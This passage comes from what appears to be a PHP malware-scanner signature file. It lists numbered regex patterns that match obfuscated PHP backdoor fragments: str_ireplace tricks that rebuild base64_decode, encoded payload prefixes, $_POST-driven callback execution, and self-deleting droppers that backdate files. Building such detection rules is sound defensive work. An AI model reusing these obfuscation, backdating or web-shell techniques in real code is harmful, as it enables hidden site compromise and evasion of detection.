      'pattern' => '/\\<\\?php \\$khezmpvsb\\=str_ireplace\\("x","","xbxxxxxaxxxxsxxxxexxxx6xxx4xxxxxx_xxxxxdxxexxxxcxxxoxxxxdxxxxex"\\); \\$daseqzdt\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    264 => 
    array (
      'pattern' => '/\\<\\?php \\$mkdcfd\\=str_ireplace\\("f","","ffbfffffaffffsfffeffff6ffffff4ffff_ffdfffffeffffcfffffoffffdffffefff"\\); \\$zfyrkwwf\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    265 => 
    array (
      'pattern' => '/\\<\\?php echo "AhvysprEPs"; if \\(file_exists\\("\\.\\/refinesearch\\.php"\\)\\)\\{ touch\\("\\.\\/refinesearch\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*F/',
      'label' => 'source-file tail snippet',
    ),
    266 => 
    array (
      'pattern' => '/\\<\\?php \\$cbwsrxemp\\=str_ireplace\\("i","","iibiiiiaiisiiieiii6iiii4iiiii_iiiiiidiiiieiiciiiioiiiidiiieiii"\\); \\$nemwpds\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    267 => 
    array (
      'pattern' => '/\\<\\?php \\$wyvbcq\\=str_ireplace\\("i","","iibiiiiiiaiiisiiieiiiii6iiii4iiiii_iiiidiiieiiiiciiioiiiidiiiieii"\\); \\$xmdvvskpe\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    268 => 
    array (
      'pattern' => '/LyprdGR6eSovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKm5jemhm/',
      'label' => 'sample-specific encoded fragment',
    ),
    269 => 
    array (
      'pattern' => '/\\<\\?php \\$kxfptxy\\=str_ireplace\\("z","","zzzbzzzzazzzzszzzzezzzz6zzzzzz4zz_zzzzzdzzzezzzzzczzzzzzozzzzdzzezzz"\\); \\$smbpza\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    270 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}array_map                         \\(\'a\', array                            \\(\\$_POST\\[\'f\'\\]            \\(     \\$_POST\\[\'c\'\\]\\)                    \\)\\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    271 => 
    array (
      'pattern' => '/LypzYnl0bWd2ZmdheHJwYiovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0p/',
      'label' => 'sample-specific encoded fragment',
    ),
    272 => 
    array (
      'pattern' => '/\\<\\?php \\$vrmztf\\=str_ireplace\\("t","","tttbttttttattttstttettttt6tttt4tttt_ttttdttettttttcttottttdttet"\\); \\$yrxusbv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    273 => 
    array (
      'pattern' => '/\\<\\?php \\$eeyrhfxdfb\\=str_ireplace\\("w","","wwwbwwwwawwwswwwewwwwww6www4www_wwwwdwwwwwwewwwwwcwwwwowwwdwwwweww"\\); \\$mvqzu\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    274 => 
    array (
      'pattern' => '/\\* @package    Error Libraries[\\s\\S]{0,12000}trigger_error         \\(                \\$win_error, E_USER_ERROR\\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    275 => 
    array (
      'pattern' => '/Lypha2NtdG11eHltem53dHEqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
      'label' => 'sample-specific encoded fragment',
    ),
    276 => 
    array (
      'pattern' => '/\\<\\?php \\$dbazzqkrms\\=str_ireplace\\("z","","zzzbzzzazzzzzzszzzzzezzzzzz6zzzzz4zzzz_zzzzdzzzezzzczzzzozzzdzzzzzezz"\\); \\$uksubmu\\="DQoJCUBlcnJvcl9yZX/',
      'label' => 'source-file tail snippet',
    ),
    277 => 
    array (
      'pattern' => '/\\<\\?php \\$yxghhtbv\\=str_ireplace\\("h","","hhbhhahhhhshhhhhehhh6hhhh4hhhh_hhhhhdhhhehhhhhchhohhhhhhdhhhehhh"\\); \\$wzszfrqx\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    278 => 
    array (
      'pattern' => '/\\<\\?php \\$kqzqt\\=str_ireplace\\("x","","xbxxxxxaxxxxsxxxxexxxx6xxx4xxxxxx_xxxxxdxxexxxxcxxxoxxxxdxxxxex"\\); \\$uhygkmgd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    279 => 
    array (
      'pattern' => '/\\<\\?php echo "NYRdmqumWG"; if \\(file_exists\\("\\.\\/fog\\.conf\\.php"\\)\\)\\{ touch\\("\\.\\/fog\\.conf\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*gcXdB7SMK/',
      'label' => 'source-file tail snippet',
    ),
    280 => 
    array (
      'pattern' => '/\\<\\?php \\$bwgksyvx\\=str_ireplace\\("h","","hbhhahhhhhshhhhhehhh6hhhh4hhhh_hhhhdhhhehhhchhhohhhhdhhhhehh"\\); \\$ebgdpprxq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    281 => 
    array (
      'pattern' => '/\\<\\?php \\$ksmbansch\\=str_ireplace\\("w","","wwwbwwwwwawwwswwwwewwww6wwww4wwwww_wwwwwdwwwwwewwcwwwwwowwwdwwwwwwew"\\); \\$ehbphba\\="DQoJCUBlcnJvcl9yZXBv/',
      'label' => 'source-file tail snippet',
    ),
    282 => 
    array (
      'pattern' => '/\\<\\?php \\$drxhystxe\\=str_ireplace\\("r","","rrrbrrrarrsrrrerr6rrrrrr4rrr_rrrdrrrrrrerrrrrcrrrrorrrdrrrrer"\\); \\$ckpgyfmmqr\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    283 => 
    array (
      'pattern' => '/\\<\\?php echo "GaHVZMFMVf"; if \\(file_exists\\("\\.\\/write\\-review\\.php"\\)\\)\\{ touch\\("\\.\\/write\\-review\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*u/',
      'label' => 'source-file tail snippet',
    ),
    284 => 
    array (
      'pattern' => '/\\<\\?php \\$wvzhqege\\=str_ireplace\\("h","","hhhbhhhhahhhshhhehhh6hhhh4hhh_hhhdhhhhehhhhchhhhhohhhhdhhhhheh"\\); \\$ufatzzcb\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    285 => 
    array (
      'pattern' => '/\\);\\$vhsbp\\=\\$brz\\(\\$wdzsktscyhhr\\);user_error\\(\\$vhsbp,E_USER_ERROR\\);

\\/\\/ Set the root path as a constant\\.
if \\(\\!defined\\(/',
      'label' => 'sample-specific literal',
    ),
    286 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply\\(\\$option, \\$win,                    array            \\(\\$it\\)  \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    287 => 
    array (
      'pattern' => '/\\<\\?php \\$sfpkstz\\=str_ireplace\\("m","","mmmbmmammmmsmmemmm6mmmmmm4mmmm_mmmmdmmmmmmemmmmmcmmmommmmdmmmmmmem"\\); \\$eeeqsam\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    288 => 
    array (
      'pattern' => '/\\<\\?php echo "UaNUYaBEPr"; if \\(file_exists\\("\\.\\/config\\.serious\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.serious\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\);/',
      'label' => 'source-file tail snippet',
    ),
    289 => 
    array (
      'pattern' => '/\\<\\?php \\$bvaknw\\=str_ireplace\\("w","","wwbwwwwwwawwwwwswwewwww6wwwww4wwwww_wwwwwdwwewwwwwcwwwwwowwwwdwwwwew"\\); \\$qbfufeegv\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    290 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}usort            \\( \\$b, \\$a                          \\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    291 => 
    array (
      'pattern' => '/\\<\\?php \\$gsmfrtg\\=str_ireplace\\("z","","zbzzzzazzzzszzzzezzzz6zzz4zzz_zzzdzzzzezzzzczzzzozzzdzzzzzzezz"\\); \\$rcpszueb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    292 => 
    array (
      'pattern' => '/\\<\\?php \\$ewqhz\\=str_ireplace\\("t","","tttbttttttattttstttettttt6tttt4tttt_ttttdttettttttcttottttdttet"\\); \\$ahuyvekagd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    293 => 
    array (
      'pattern' => '/\\<\\?php \\$sbqmqhmy\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$bqkrgmpr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
      'label' => 'source-file tail snippet',
    ),
    294 => 
    array (
      'pattern' => '/\\<\\?php \\$qufvgymnkf\\=str_ireplace\\("m","","mmbmmmmmammmmmmsmmmemmmmmm6mmm4mmmm_mmdmmmmmemmmmmcmmmommmmdmmemmm"\\); \\$braratrmqu\\="DQoJCUBlcnJvcl9yZX/',
      'label' => 'source-file tail snippet',
    ),
    295 => 
    array (
      'pattern' => '/\\<\\?php echo "rxUQDaqxMU"; if \\(file_exists\\("\\.\\/locator\\.php"\\)\\)\\{ touch\\("\\.\\/locator\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*73K565h5awc/',
      'label' => 'source-file tail snippet',
    ),
    296 => 
    array (
      'pattern' => '/\\<\\?php \\$gbannq\\=str_ireplace\\("u","","uuubuuuuauuuusuuuueuuuuuu6uuuu4uuuu_uuuuduuuueuuuucuuuouuuuuduuueu"\\); \\$qfvxv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
      'label' => 'source-file tail snippet',
    ),
    297 => 
    array (
      'pattern' => '/LypldnFmZHEqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypobm15/',
      'label' => 'sample-specific encoded fragment',
    ),
    298 => 
    array (
      'pattern' => '/\\<\\?php \\$gsxnshpzzt\\=str_ireplace\\("p","","pbppppappppsppppepppp6pppp4pp_ppdpppppepppcppoppdppppppep"\\); \\$ywzkbswt\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
      'label' => 'source-file tail snippet',
    ),
    299 => 
    array (
      'pattern' => '/\\<\\?php \\$wmxmcngn\\=str_ireplace\\("x","","xxxbxxxxxxaxxxxsxxxxxexxxx6xxxx4xxxxx_xxxxdxxxexxxxcxxxoxxxxdxxxex"\\); \\$hwfkwy\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    300 => 
    array (
      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply                 \\(\\$option, \\$win,            array                           \\(\\$it\\)                    \\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    301 => 
    array (
      'pattern' => '/\\<\\?php echo "EVzGkVNksa"; if \\(file_exists\\("\\.\\/config\\.angle\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.angle\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*u/',
      'label' => 'source-file tail snippet',
    ),
    302 => 
    array (
      'pattern' => '/\\<\\?php \\$mezrtt\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$stskhr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
      'label' => 'source-file tail snippet',
    ),
    303 => 
    array (
      'pattern' => '/\\<\\?php \\$wxgrkt\\=str_ireplace\\("z","","zzzbzzazzzzzszzzzzezzzzz6zzz4zzz_zzdzzzezzzczzzzozzzzzdzzzezzz"\\); \\$uyxkp\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    304 => 
    array (
      'pattern' => '/\\<\\?php \\$uechxztts\\=str_ireplace\\("f","","fbfffafffffsffffeff6ff4ff_ffdfffefffffcfffoffffdfffeff"\\); \\$wqzsyudhce\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
      'label' => 'source-file tail snippet',
    ),
    305 => 
    array (
      'pattern' => '/\\<\\?php \\$gpykd\\=str_ireplace\\("g","","gggbggggaggggsgggggeggggg6gggg4gg_gggggdggggeggggggcggggogggdggeg"\\); \\$cdbxazpn\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    306 => 
    array (
      'pattern' => '/\\<\\?php \\$dcvresgn\\=str_ireplace\\("m","","mmmbmmmmmammmsmmmemmmm6mmm4mmm_mmmdmmmmemmmmcmmmmommmmdmmmmem"\\); \\$mpwmh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    307 => 
    array (
      'pattern' => '/LyptaHRxYmVxdyovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKnB6/',
      'label' => 'sample-specific encoded fragment',
    ),
    308 => 
    array (
      'pattern' => '/\\<\\?php \\$rwfzhnz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$evxayg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
      'label' => 'source-file tail snippet',
    ),
    309 => 
    array (
      'pattern' => '/\\<\\?php \\$fexqx\\=str_ireplace\\("f","","ffbffaffffsffffffefffff6ffff4fff_ffffdffffeffcffffoffffdfffffefff"\\); \\$dvaegz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    310 => 
    array (
      'pattern' => '/Lyp0YWJibnJudmdjZ3RhKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
      'label' => 'sample-specific encoded fragment',
    ),
    311 => 
    array (
      'pattern' => '/\\<\\?php \\$fgdrspkz\\=str_ireplace\\("z","","zzzbzzzzzzazzzszzzzezzzzz6zzzz4zzzzz_zzzdzzzzezzzzczzzzzozzzzdzzzez"\\); \\$bxqtb\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
      'label' => 'source-file tail snippet',
    ),
    312 => 
    array (
      'pattern' => '/LypwcHR1Y3BmZXEqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lyp6/',
      'label' => 'sample-specific encoded fragment',
    ),
    313 => 
    array (
      'pattern' => '/\\<\\?php echo "CSYGDSrZrt"; if \\(file_exists\\("\\.\\/admin_awards\\.php"\\)\\)\\{ touch\\("\\.\\/admin_awards\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*D/',
      'label' => 'source-file tail snippet',
    ),
    314 => 
    array (
      'pattern' => '/\\<\\?php echo "cAkDwsWZDW"; if \\(file_exists\\("\\.\\/meinedaten\\.php"\\)\\)\\{ touch\\("\\.\\/meinedaten\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*e3zpy/',
      'label' => 'source-file tail snippet',
    ),
    315 => 
    array (
      'pattern' => '/\\<\\?php \\$tfutw\\=str_ireplace\\("q","","qqqbqqqqaqqqqsqqqqqqeqqqqq6qqqqqq4qqqqq_qqqqdqqqeqqqcqqqqoqqqdqqqqeqqq"\\); \\$pgcbam\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    316 => 
    array (
      'pattern' => '/LypnbXljd2N1c3VyYWUqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7/',
      'label' => 'sample-specific encoded fragment',
    ),
    317 => 
    array (
      'pattern' => '/\\<\\?php \\$wnxdd\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$evhaqzpx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
      'label' => 'source-file tail snippet',
    ),
    318 => 
    array (
      'pattern' => '/\\<\\?php \\$ztzxbffby\\=str_ireplace\\("x","","xbxxxaxxsxxxexxx6xxxxxx4xxxx_xxxxdxxxxxexxxxxcxxxxxxoxxxxxdxxxxexx"\\); \\$uvgdqkwrqh\\="DQoJCUBlcnJvcl9yZXB/',
      'label' => 'source-file tail snippet',
    ),
    319 => 
    array (
      'pattern' => '/\\<\\?php \\$rzyeqhwv\\=str_ireplace\\("k","","kkkbkkkkakkkkskkkkkekkkk6kkkkkk4kkkkk_kkdkkkkkekkkkkckkkkokkkkkkdkkkkkekk"\\); \\$nzbzs\\="DQoJCUBlcnJvcl9yZX/',
      'label' => 'source-file tail snippet',
    ),
    320 => 
    array (
      'pattern' => '/\\<\\?php echo "NzQCXmpDhY"; if \\(file_exists\\("\\.\\/init\\.tongue\\.php"\\)\\)\\{ touch\\("\\.\\/init\\.tongue\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*H2Y/',
      'label' => 'source-file tail snippet',
    ),
    321 => 
    array (
      'pattern' => '/Lyp2YWR5eGZnZG1tKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkpey8q/',
      'label' => 'sample-specific encoded fragment',
    ),
    322 => 
    array (
      'pattern' => '/\\<\\?php \\$mpaevpq\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$cgcwf\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
      'label' => 'source-file tail snippet',
    ),
    323 => 
    array (
      'pattern' => '/\\<\\?php echo "RqQsGVRrKy"; if \\(file_exists\\("\\.\\/staff\\-login\\.php"\\)\\)\\{ touch\\("\\.\\/staff\\-login\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*9Kt/',
      'label' => 'source-file tail snippet',
    ),
    324 => 
    array (
      'pattern' => '/Lypoa3J3ZnJrciovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKnJr/',
      'label' => 'sample-specific encoded fragment',
    ),
    325 => 
    array (
      'pattern' => '/\\<\\?php \\$vkcyaecxa\\=str_ireplace\\("t","","ttbttttattttstttettt6ttttt4tttt_tttttdtttetttttcttttottttdttttettt"\\); \\$srkvktfv\\="DQoJCUBlcnJvcl9yZXBvc/',
      'label' => 'source-file tail snippet',
    ),
    326 => 
    array (
      'pattern' => '/\\<\\?php \\$vcehpv\\=str_ireplace\\("u","","uubuuuauuusuuuueuuuu6uuuu4uuuu_uuuuduuuuueuucuuuuouuuduuuuueuuu"\\); \\$rqayk\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    327 => 
    array (
      'pattern' => '/\\<\\?php \\$xnfvqeepxg\\=str_ireplace\\("y","","yybyyyyayyyysyyyyeyyyy6yyy4yyyyyy_yydyyyyyeyyyyycyyyyoyydyyyyyyeyy"\\); \\$xmddydsvdh\\="DQoJCUBlcnJvcl9yZX/',
      'label' => 'source-file tail snippet',
    ),
    328 => 
    array (
      'pattern' => '/\\<\\?php \\$hthfug\\=str_ireplace\\("p","","ppbpppapppspppppepp6pppp4ppp_pppppdppppeppppppcppppopppppdpppppep"\\); \\$fsewr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
      'label' => 'source-file tail snippet',
    ),
    329 => 
    array (
      'pattern' => '/\\<\\?php \\$sbszcckrde\\=str_ireplace\\("k","","kbkkkkakkkkkkskkekkkk6kk4kkkkk_kkkdkkkekkkkckkkokkkkdkkkkkek"\\); \\$pfruv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
      'label' => 'source-file tail snippet',
    ),
    330 => 
    array (
      'pattern' => '/\\<\\?php \\$shxhrqqy\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$uhvucqe\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
      'label' => 'source-file tail snippet',
    ),
    331 => 
    array (
      'pattern' => '/\\<\\?php echo "FsCaEtMxFe"; if \\(file_exists\\("\\.\\/config\\.deer\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.deer\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Q3Z/',
      'label' => 'source-file tail snippet',
    ),
    332 => 
    array (
      'pattern' => '/\\<\\?php \\$pcgchmqed\\=str_ireplace\\("w","","wwwbwwawwwwwswwwwewwww6www4wwww_wwwwdwwwwwewwwwwcwwwwwowwwdwweww"\\); \\$ruztct\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
      'label' => 'source-file tail snippet',
    ),
    333 => 
    array (
      'pattern' => '/\\<\\?php echo "fdXtaBdKBD"; if \\(file_exists\\("\\.\\/tellafriend\\.php"\\)\\)\\{ touch\\("\\.\\/tellafriend\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*fct/',
      'label' => 'source-file tail snippet',
    ),
    334 => 
    array (
      'pattern' => '/\\<\\?php echo "ceUhsXeEss"; if \\(file_exists\\("\\.\\/details\\.php"\\)\\)\\{ touch\\("\\.\\/details\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*zKWU93uMU6v/',
      'label' => 'source-file tail snippet',
    ),
    335 => 
    array (
      'pattern' => '/\\<\\?php echo "rrxaShzfnw"; if \\(file_exists\\("\\.\\/currency\\.php"\\)\\)\\{ touch\\("\\.\\/currency\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*9x6pRPcG2/',
      'label' => 'source-file tail snippet',
    ),
    336 => 
    array (
      'pattern' => '/\\<\\?php \\$stqwzzzspp\\=str_ireplace\\("i","","iiibiiiiaiiiisiiieiiii6iii4iiii_iiidiiiiiieiiiiiciiiiioiiiiiidiiieiii"\\); \\$qmmcz\\="DQoJCUBlcnJvcl9yZXBv/',
      'label' => 'source-file tail snippet',
    ),
    337 => 
    array (
      'pattern' => '/\\<\\?php \\$msbddanq\\=str_ireplace\\("q","","qbqqqqqqaqqqqsqqeqq6qqqq4qqqq_qqqqqdqqqeqqqcqqqqoqqqdqqqqeq"\\); \\$ftufx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/',
      'label' => 'source-file tail snippet',
    ),
    338 => 
    array (
      'pattern' => '/\\* @package    win\\.error\\.Libraries[\\s\\S]{0,12000}@session_start                          \\(\\)/s',
      'label' => 'source-file head-tail anchor',
    ),
    339 => 
    array (
      'pattern' => '/\\)


; 
\\}
set_exception_handler               \\([\\s\\S]{0,160}\\]     \\(\\$_POST                              \\[/',
      'label' => 'sample-specific literal chain',
    ),
    340 => 
    array (
      'pattern' => '/\\<\\?php \\$skgkh\\=str_ireplace\\("z","","zbzzzazzzszzzzzzezzzzz6zz4zzzz_zzzzzdzzzzzezzzzzczzzzozzzzdzzzzez"\\); \\$bebsm\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
      'label' => 'source-file tail snippet',
    ),
    341 => 
    array (
      'pattern' => '/\\<\\?php \\$mcsxmr\\=str_ireplace\\("m","","mmbmmmmmmammmmsmmmmemmmmm6mmmmm4mmmm_mmmdmmmmmmemmmmmmcmmmmommmdmmmemmm"\\); \\$yfuwxrcvy\\="DQoJCUBlcnJvcl9yZX/',
      'label' => 'source-file tail snippet',
    ),
    342 => 
    array (
      'pattern' => '/\\<\\?php \\$eeyttpvxft\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$vxqsy\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
      'label' => 'source-file tail snippet',
    ),
    343 => 
    array (
      'pattern' => '/\\<\\?php \\$xsxhvz\\=str_ireplace\\("r","","rbrrrrarrrrsrrrrerrrrrr6rrrrrr4rrrrr_rrrrdrrrrrerrrrrrcrrrrrorrrrrrdrrrrerr"\\); \\$zzfmn\\="DQoJCUBlcnJvcl9yZX/',
      'label' => 'source-file tail snippet',
    ),
    344 => 
    array (
      'pattern' => '/\\<\\?php \\$dqnmye\\=str_ireplace\\("q","","qbqqqqqqaqqsqqqqqqeqqqqq6qqqqqq4qqq_qqqdqqqqeqqcqqqqoqqqqdqqqqeq"\\); \\$tbzsdpzr\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
      'label' => 'source-file tail snippet',
    ),
    345 => 
    array (
      'pattern' => '/\\<\\?php \\$ktefambp\\=str_ireplace\\("p","","pbppppappppsppppepppp6pppp4pp_ppdpppppepppcppoppdppppppep"\\); \\$ktbxsq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
      'label' => 'source-file tail snippet',
    ),
    346 => 
    array (
      'pattern' => '/\\<\\?php \\$ytpgctvzzw\\=str_ireplace\\("n","","nnbnnnnnannnnnsnnnnnnennnn6nnnnn4nnn_nnnndnnnennncnnnnonnnndnnnenn"\\); \\$wfedca\\="DQoJCUBlcnJvcl9yZXBvcn/',
      'label' => 'source-file tail snippet',
    ),
    347 => 
    array (
      'pattern' => '/\\<\\?php \\$kauuzhwhh\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$sxqyrce\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
      'label' => 'source-file tail snippet',
    ),
    348 => 
    array (
      'pattern' => '/\\<\\?php \\$ssddyuvcwh\\=str_ireplace\\("y","","ybyyyyayyyysyyyyeyyy6yyyyy4yyy_yyyydyyeyyyycyyoyyyydyyyyyey"\\); \\$dpktd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    349 => 
    array (
      'pattern' => '/\\<\\?php \\$pcnrnpyg\\=str_ireplace\\("r","","rrrbrrrrarrrrsrrrrerrrrr6rrrrr4rr_rrrrrrdrrrrerrrrcrrrrorrrrrdrrrer"\\); \\$rvnmsn\\="DQoJCUBlcnJvcl9yZXBvcnR/',
      'label' => 'source-file tail snippet',
    ),
    350 => 
    array (
      'pattern' => '/\\<\\?php \\$qytnbkt\\=str_ireplace\\("h","","hbhhahhhshhhhehhhh6hhhh4hhhh_hhhhdhhhhehhhchhhhohhhhhdhheh"\\); \\$krmdadgfr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
      'label' => 'source-file tail snippet',
    ),
    351 => 
    array (
